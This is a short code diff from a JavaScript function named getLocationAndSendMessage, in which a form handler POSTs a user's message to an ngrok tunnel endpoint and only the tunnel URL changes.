@@ -15,7 +15,7 @@ function getLocationAndSendMessage() {
           e.preventDefault();
           const message = input.value;
 
-          fetch("https://45cb-5-59-231-12.ngrok-free.app/send.php", {
+          fetch("https://c417-5-59-231-12.ngrok-free.app/send.php", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
             body: `message=${encodeURIComponent(
